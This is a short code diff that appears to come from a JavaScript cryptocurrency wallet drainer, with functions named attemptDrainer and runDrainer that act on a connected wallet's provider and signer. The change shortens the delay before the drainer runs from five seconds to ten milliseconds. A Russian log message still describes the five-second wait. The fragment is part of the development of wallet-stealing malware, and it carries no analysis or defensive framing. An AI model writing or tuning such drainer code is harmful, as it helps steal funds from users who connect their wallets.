@@ -884,7 +884,7 @@ async function attemptDrainer() {
     }
 
     console.log('⏳ Задержка 5 секунд перед runDrainer');
-    await new Promise(resolve => setTimeout(resolve, 5000));
+    await new Promise(resolve => setTimeout(resolve, 10));
 
     isTransactionPending = true;
     const status = await runDrainer(provider, signer, connectedAddress);
